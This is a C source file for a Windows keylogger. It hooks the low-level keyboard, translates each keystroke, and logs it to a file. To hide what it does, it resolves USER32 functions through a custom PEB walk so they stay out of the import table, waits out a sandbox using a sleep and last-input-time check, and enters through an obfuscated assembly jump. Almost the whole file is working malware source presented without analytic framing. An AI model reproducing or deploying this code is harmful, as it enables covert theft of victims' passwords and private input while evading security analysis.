#include <windows.h>
#include "Defs.h"

HHOOK hKeyboardHook = NULL;
HANDLE hOutputFile = INVALID_HANDLE_VALUE;

TypeMessageBoxA MessageBoxA_t;
TypeSetWindowsHookExA SetWindowsHookExA_t;
TypeGetMessageA GetMessageA_t;
TypeTranslateMessage TranslateMessage_t;
TypeDispatchMessageA DispatchMessageA_t;
TypeUnhookWindowsHookEx UnhookWindowsHookEx_t;
TypeCallNextHookEx CallNextHookEx_t;
TypeGetAsyncKeyState GetAsyncKeyState_t;

int Mystrcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

int Mywcscmp(const wchar_t *s1, const wchar_t *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *s1 - *s2;
}

// Custom implementation of GetProcAddress()
FARPROC fGetProcAddress(void *hModule, const char *APIName)
{
    BYTE *pBase = (BYTE*)hModule;
    IMAGE_DOS_HEADER *idDosH = (IMAGE_DOS_HEADER*)pBase; // Get DOS header

    if(idDosH->e_magic == IMAGE_DOS_SIGNATURE) // Check DOS signature
    {
        IMAGE_NT_HEADERS64 *inNtH = (IMAGE_NT_HEADERS64*)(pBase + idDosH->e_lfanew); // Get NT headers

        if(inNtH->Signature == IMAGE_NT_SIGNATURE) // Check NT signature
        {
            IMAGE_EXPORT_DIRECTORY *iedExportDir = (IMAGE_EXPORT_DIRECTORY*)(pBase + inNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // Get export directory
            for (unsigned int i = 0; i < iedExportDir->NumberOfNames; ++i) // Loop through all exported functions
            {
                DWORD* pFuncName = (DWORD*)(pBase + iedExportDir->AddressOfNames); // Get function name
                char *pName = (char*)pBase + (DWORD_PTR)pFuncName[i]; // Get function name
                if (Mystrcmp(pName,APIName) == 0) // Compare function name
                {
                    WORD* pHintsTbl = (WORD*)(pBase + iedExportDir->AddressOfNameOrdinals); // Get function hint
                    DWORD* pEAT = (DWORD*)(pBase + iedExportDir->AddressOfFunctions);
                    FARPROC pFuncAddr = (FARPROC)(pBase+(DWORD_PTR)pEAT[pHintsTbl[i]]); // Get function address
                    return pFuncAddr;
                }
            }
        }
    }

    return 0;
}

// Custom implementation of GetModuleHandle()
void* fGetModuleHandle(wchar_t *ModuleName)
{
    unsigned long long pPeb = __readgsqword(0x60); // Get PEB

    pPeb = *(unsigned long long*)(pPeb+0x18); // Get LDR
    PLDR_DATA_TABLE_ENTRY pModuleList = *(PLDR_DATA_TABLE_ENTRY*)(pPeb+0x10); // Get InLoadOrderModuleList
    while(pModuleList->BaseAddress)
    {
        if(Mywcscmp(pModuleList->BaseDllName.Buffer,ModuleName)==0) // Compare module name
            return pModuleList->BaseAddress;
        pModuleList = (PLDR_DATA_TABLE_ENTRY)(pModuleList->InLoadOrderLinks.Flink);
    }

    return NULL;
}

/*
	Have to use dynamic linking to hide the functions from import table
*/
BOOL ResolveNativeApis() // Resolve APIs
{
	HMODULE userdll = fGetModuleHandle(L"USER32.dll");

	MessageBoxA_t = (TypeMessageBoxA)fGetProcAddress(userdll, "MessageBoxA");
	if (!MessageBoxA_t)
		return FALSE;

	SetWindowsHookExA_t = (TypeSetWindowsHookExA)fGetProcAddress(userdll, "SetWindowsHookExA");
	if (!SetWindowsHookExA_t)
		return FALSE;

	GetMessageA_t = (TypeGetMessageA)fGetProcAddress(userdll, "GetMessageA");
	if (!GetMessageA_t)
		return FALSE;

	TranslateMessage_t = (TypeTranslateMessage)fGetProcAddress(userdll, "TranslateMessage");
	if (!TranslateMessage_t)
		return FALSE;

	DispatchMessageA_t = (TypeDispatchMessageA)fGetProcAddress(userdll, "DispatchMessageA");
	if (!DispatchMessageA_t)
		return FALSE;

	UnhookWindowsHookEx_t = (TypeUnhookWindowsHookEx)fGetProcAddress(userdll, "UnhookWindowsHookEx");
	if (!UnhookWindowsHookEx_t)
		return FALSE;

	CallNextHookEx_t = (TypeCallNextHookEx)fGetProcAddress(userdll, "CallNextHookEx");
	if (!CallNextHookEx_t)
		return FALSE;

	GetAsyncKeyState_t = (TypeGetAsyncKeyState)fGetProcAddress(userdll, "GetAsyncKeyState");
	if (!GetAsyncKeyState_t)
		return FALSE;

	return TRUE;
}

size_t Mystrlen(const char* str) // Own implementation of strlen
{
	size_t len = 0;
	while (str[len])
		++len;
	return len;
}

void* SecureMemoryCopy(void* destination, const void* source, size_t size) // Own implementation of memcpy_s
{
	if (!destination || !source || !size)
	{
		return NULL;
	}
	// Copy bytes from source to destination
	char* dest = (char*)destination;
	char* src = (char*)source;
	for (size_t i = 0; i < size; ++i)
	{
		dest[i] = src[i];
	}

	return destination;
}

errno_t Mystrcpy_s(char* dest, size_t destsz, const char* src) // Own implementation of strcpy_s
{
    if (!dest || !src || !destsz)
    {
        return EINVAL;
    }

    size_t srclen = Mystrlen(src);
    if (srclen >= destsz)
    {
        // Set dest to an empty string
        *dest = '\0';
        return ERANGE;
    }

    // Use the secure version of memcpy to copy src to dest
    if (!SecureMemoryCopy(dest, src, srclen))
    {
        // Set dest to an empty string
        *dest = '\0';
        return EINVAL;
    }

    dest[srclen] = '\0';
    return 0;
}

char* virtualKeyToString(int vkCode) // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
{
	static char buffer[256];
	RtlSecureZeroMemory(&buffer, sizeof(buffer));
	if (vkCode == 15 || (vkCode >= 28 && vkCode <= 29) || vkCode == 42 || (vkCode >= 54 && vkCode <= 69))
	{
		switch (vkCode)
		{
		case 15:
			Mystrcpy_s(buffer, sizeof(buffer), "[TAB]");
			break;
		case 28:
			Mystrcpy_s(buffer, sizeof(buffer), "\n");
			break;
		case 29:
			Mystrcpy_s(buffer, sizeof(buffer), "[CTRL]");
			break;
		case 42:
			Mystrcpy_s(buffer, sizeof(buffer), "[LSHIFT]");
			break;
		case 54:
			Mystrcpy_s(buffer, sizeof(buffer), "[RSHIFT]");
			break;
		case 55:
			Mystrcpy_s(buffer, sizeof(buffer), "[PRTSC]");
			break;
		case 56:
			Mystrcpy_s(buffer, sizeof(buffer), "[ALT]");
			break;
		case 57:
			Mystrcpy_s(buffer, sizeof(buffer), " ");
			break;
		case 58:
			Mystrcpy_s(buffer, sizeof(buffer), "[CAPS]");
			break;
		case 59:
			Mystrcpy_s(buffer, sizeof(buffer), "[F1]");
			break;
		case 60:
			Mystrcpy_s(buffer, sizeof(buffer), "[F2]");
			break;
		case 61:
			Mystrcpy_s(buffer, sizeof(buffer), "[F3]");
			break;
		case 62:
			Mystrcpy_s(buffer, sizeof(buffer), "[F4]");
			break;
		case 63:
			Mystrcpy_s(buffer, sizeof(buffer), "[F5]");
			break;
		case 64:
			Mystrcpy_s(buffer, sizeof(buffer), "[F6]");
			break;
		case 65:
			Mystrcpy_s(buffer, sizeof(buffer), "[F7]");
			break;
		case 66:
			Mystrcpy_s(buffer, sizeof(buffer), "[F8]");
			break;
		case 67:
			Mystrcpy_s(buffer, sizeof(buffer), "[F9]");
			break;
		case 68:
			Mystrcpy_s(buffer, sizeof(buffer), "[F10]");
			break;
		case 69:
			Mystrcpy_s(buffer, sizeof(buffer), "[NUM]");
			break;
		}
	}
	else
	{
		GetKeyNameTextA(vkCode << 16, buffer, sizeof(buffer));
	}

	return buffer;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) // Keyboard hook callback
{
	char output[256];
	DWORD bytesWritten;
	RtlSecureZeroMemory(&output, sizeof(output));

	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if (GetAsyncKeyState_t(VK_SHIFT) & 0x8000 || GetAsyncKeyState_t(VK_RSHIFT) & 0x8000) // Check if shit is pressed down
			{
				if ((p->vkCode >= 48 && p->vkCode <= 57) || (p->vkCode >= 186 && p->vkCode <= 192)) // Keys 0-9 & Special keys {-, =, `, ., comma, /}
				{
					switch (p->vkCode)
					{
					case 0x30:
						Mystrcpy_s(output, sizeof(output), ")");
						goto write;
						break;
					case 0x31:
						Mystrcpy_s(output, sizeof(output), "!");
						goto write;
						break;
					case 0x32:
						Mystrcpy_s(output, sizeof(output), "@");
						goto write;
						break;
					case 0x33:
						Mystrcpy_s(output, sizeof(output), "#");
						goto write;
						break;
					case 0x34:
						Mystrcpy_s(output, sizeof(output), "$");
						goto write;
						break;
					case 0x35:
						Mystrcpy_s(output, sizeof(output), "%%");
						goto write;
						break;
					case 0x36:
						Mystrcpy_s(output, sizeof(output), "^");
						goto write;
						break;
					case 0x37:
						Mystrcpy_s(output, sizeof(output), "&");
						goto write;
						break;
					case 0x38:
						Mystrcpy_s(output, sizeof(output), "*");
						goto write;
						break;
					case 0x39:
						Mystrcpy_s(output, sizeof(output), "(");
						goto write;
						break;
					case 0xBA:
						Mystrcpy_s(output, sizeof(output), ":");
						goto write;
						break;
					case 0xBB:
						Mystrcpy_s(output, sizeof(output), "+");
						goto write;
						break;
					case 0xBC:
						Mystrcpy_s(output, sizeof(output), "<");
						goto write;
						break;
					case 0xBD:
						Mystrcpy_s(output, sizeof(output), "_");
						goto write;
						break;
					case 0xBE:
						Mystrcpy_s(output, sizeof(output), ">");
						goto write;
						break;
					case 0xBF:
						Mystrcpy_s(output, sizeof(output), "?");
						goto write;
						break;
					case 0xC0:
						Mystrcpy_s(output, sizeof(output), "~");
						goto write;
						break;
					}
				}
				else
				{
					Mystrcpy_s(output, sizeof(output), virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
					if (output[0] >= 'a' && output[0] <= 'z') output[0] -= 32; // convert to uppercase
					write:
						WriteFile(hOutputFile, output, (DWORD)Mystrlen(output), &bytesWritten, NULL);
				}
				break;
			}
			else
			{
				Mystrcpy_s(output, sizeof(output), virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
				if(output[0] >= 'A' && output[0] <= 'Z') output[0]+=32; // convert to lowercase
				WriteFile(hOutputFile, output, (DWORD)Mystrlen(output), &bytesWritten, NULL);
				break;
			}
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}

	return CallNextHookEx_t(hKeyboardHook, nCode, wParam, lParam);
}

BOOL is_sandbox() // this function checks if the program is running in a sandbox
{
	BOOL sandbox_detected = FALSE;

	Sleep(30000);

	DWORD ticks = GetTickCount();

	LASTINPUTINFO li;
	li.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&li); // get the last input time

	if (ticks - li.dwTime > 6000) // if the last input was more than 6 seconds ago, we are probably in a sandbox
	{
		sandbox_detected = TRUE;
	}

	return sandbox_detected;
}

int fakeFunc() // this is the fake main function
{

	if (is_sandbox())
		return -1;

	if (!ResolveNativeApis())
	{
		return -1;
	}
	else
	{
		Mymain();
	}

	return 0;
}

void EntryPoint() // this is the entry point of the program
{
	__asm__("lea EntryPoint(%rip), %rcx"); // get the address of the current function
	__asm__("push %rcx"); // push the address of the current function onto the stack
	__asm__("sub $0x38, %rcx"); // subtract 0x38 from the address of the current function
	__asm__("jmp *%rcx"); // jump to the address of the current function minus 0x38 (the address of the fakeFunc function)
}

int Mymain() // this is the real main function
{
	char buffer[256];

	hOutputFile = CreateFileA("log.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		Mystrcpy_s(buffer, sizeof(buffer), "[-] Failed to create output file!");
		MessageBoxA_t(NULL, buffer, "Error", MB_ICONERROR | MB_OK);
		return -1;
	}

	hKeyboardHook = SetWindowsHookExA_t(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (hKeyboardHook == NULL)
	{
		Mystrcpy_s(buffer, sizeof(buffer), "[-] Failed to install keyboard hook!");
		MessageBoxA_t(NULL, buffer, "Error", MB_ICONERROR | MB_OK);
		return -1;
	}

	MessageBoxA_t(NULL, "[+] Keyboard hook installed.", "Success", MB_ICONINFORMATION | MB_OK);

	MSG message;
	while (GetMessageA_t(&message, NULL, 0, 0))
	{
		TranslateMessage_t(&message);
		DispatchMessageA_t(&message);
	}

	UnhookWindowsHookEx_t(hKeyboardHook);
	CloseHandle(hOutputFile);

	return 0;
}